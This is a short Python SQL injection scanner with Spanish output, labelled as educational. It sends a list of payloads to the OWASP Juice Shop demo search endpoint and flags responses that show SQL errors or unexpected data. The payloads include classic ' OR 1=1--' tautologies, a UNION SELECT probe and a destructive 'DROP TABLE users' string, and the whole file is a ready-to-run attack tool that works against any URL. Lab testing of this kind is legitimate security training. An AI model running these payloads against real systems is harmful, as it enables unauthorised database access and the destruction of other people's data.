"""
Advanced SQL Injection Reflected Test Script
Author: Bastián Landskron
Purpose: Educational testing of basic SQLi payloads on lab environments.
Disclaimer: Use only in authorized and ethical lab settings.
"""

import requests
import sys
import time
from urllib.parse import quote

# Configurable variables
TARGET_URL = "https://demo.owasp-juice.shop/rest/products/search?q="
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' UNION SELECT null,null--",
    "' AND 1=2--"
]

def print_header():
    print("=" * 70)
    print("🧪 SQL Injection Reflected Scanner - Modo Profesional")
    print("=" * 70)
    print(f"Objetivo: {TARGET_URL}")
    print(f"Total de payloads a probar: {len(PAYLOADS)}")
    print("=" * 70)
    print()

def test_sql_injection():
    for payload in PAYLOADS:
        encoded_payload = quote(payload)
        url = TARGET_URL + encoded_payload
        print(f"[+] Probandor payload: {payload}")
        try:
            response = requests.get(url, timeout=10)
            content = response.text.lower()

            # Indicadores de vulnerabilidad
            vulnerable = False
            if "sql" in content or "mysql" in content or "error" in content:
                print("⚠️  Posible error SQL detectado.")
                vulnerable = True
            elif "artist" in content or "<li>" in content:
                print("✅ Inyección posible: datos visibles inesperadamente.")
                vulnerable = True

            # Mostrar resultado parcial
            print("📄 Respuesta parcial:")
            print(response.text[:400].strip().replace("\n", " ") + "\n")

            if not vulnerable:
                print("ℹ️  No se detectaron indicadores evidentes.")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error al conectarse: {e}")
        print("-" * 70)
        time.sleep(1)

if __name__ == "__main__":
    print_header()
    test_sql_injection()
